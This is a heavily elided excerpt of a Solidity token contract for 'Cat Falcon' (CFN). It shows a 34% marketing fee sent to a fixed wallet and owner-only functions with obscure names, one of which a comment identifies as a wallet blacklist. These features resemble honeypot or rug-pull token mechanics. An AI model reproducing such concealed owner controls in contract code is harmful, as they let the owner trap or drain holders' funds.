...
/**
Telegram : https://t.me/CatFalconOfficial
*/
...
contract CatFalcon  is Context, IERC20, Ownable {
    ...
    string private constant _name = "Cat Falcon"; // 
    string private constant _symbol = unicode"CFN"; //    
    uint8 private constant _decimals = 9; // 
    
    
    uint256 public _marketingFee = 34;
    uint256 public _liquidityFee = 1;
    address private  _marketingWallet = 0xBE05A088F71C6cA48b10B8add8f7f3923Eb388F7;
    ...
    function Asaproter(address account) public onlyOwner {
...
/*
    ...
    */
    ...
    function toLPtwo2(address[] calldata addresses) external onlyOwner {
 ...
 // Blacklist - block wallets (REMOVE - COMMA SEPARATE MULTIPLE WALLETS)
    function rmvulock(address[] calldata addresses) external onlyOwner {
 ...
 /*
    ...
    */
    ...
    // Set the maximum wallet holding (percent of total supply)
     function maxWalletproved(uint256 maxWallPercent_x100) external onlyOwner() {
